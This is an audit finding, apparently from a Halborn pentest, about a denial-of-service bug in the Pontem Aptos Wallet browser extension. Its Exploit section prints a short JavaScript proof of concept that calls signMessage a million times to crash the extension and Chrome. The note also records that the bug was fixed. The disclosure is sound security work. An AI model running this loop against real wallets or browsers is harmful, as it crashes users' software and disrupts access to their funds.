---
tags:
  - lang/move
  - platform/halborn
  - has/github
  - has/poc
  - severity/high
  - sector/wallet
protocol: "[[Aptos Wallet]]"
auditors:
  - "[[Halborn]]"
report: "https://www.halborn.com/audits/pontem-network/aptos-wallet-webapp-pentest"
genome:
  - "[[frozen-funds]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
---
# POTENTIAL MEMORY LEAK ON `signMessage`- BROWSER DENIAL OF SERVICE

- id: 50669
- impact: HIGH
- protocol: [[Aptos Wallet]]
- reporter: Halborn
- source: https://www.halborn.com/audits/pontem-network/aptos-wallet-webapp-pentest

## Summary


The Pontem Aptos Wallet had a bug that allowed an attacker to execute harmful code, causing a Denial of Service (DoS) on the extension and the Chrome browser. This means that the attacker could use the code to crash the extension and browser, making them unusable. The code used to exploit this vulnerability was shared in the report. The impact and likelihood of this bug were rated as 5 out of 5. However, the bug has been fixed in a recent update to the wallet. 

## Details

##### Description

`Pontem Aptos Wallet` allowed an attacker to execute malicious code using the exported wallet functions, triggering a Denial of Service on the extension and the Browser (Chrome v105.0.5195.125).
An attacker could use the malicious code to call the wallet (locked and unlocked) to trigger a Denial of Service on the browser, closing the running process.

#### Exploit

```
async function sign(){
  window.pontem.signMessage('Signed message')
    .then(result => {
    console.log('Signed Message', result)
    })
    .catch(e => console.log('Error', e))
}

async function exploitDoS(){
  for(i =0;i<1000000;i++){
    sign()
  }
}

```

[Extension Denial-of-Service](https://www.loom.com/share/e3e4d111446540288014fde407673421)

[Browser Denial-of-Service](https://www.loom.com/share/4b6b270a69c941989aaa68e0eb428768)

##### Score

Impact: 5  
Likelihood: 5

##### Recommendation

`SOLVED`: The issue was solved in the following GitHub Pull Request ([Commit 45429fb617843ccfbbab62dec76c77a4001ea73d](https://github.com/pontem-network/pontem-pitaka/pull/113/commits/45429fb617843ccfbbab62dec76c77a4001ea73d)):
[Feature apt 643 #113](https://github.com/pontem-network/pontem-pitaka/pull/113)
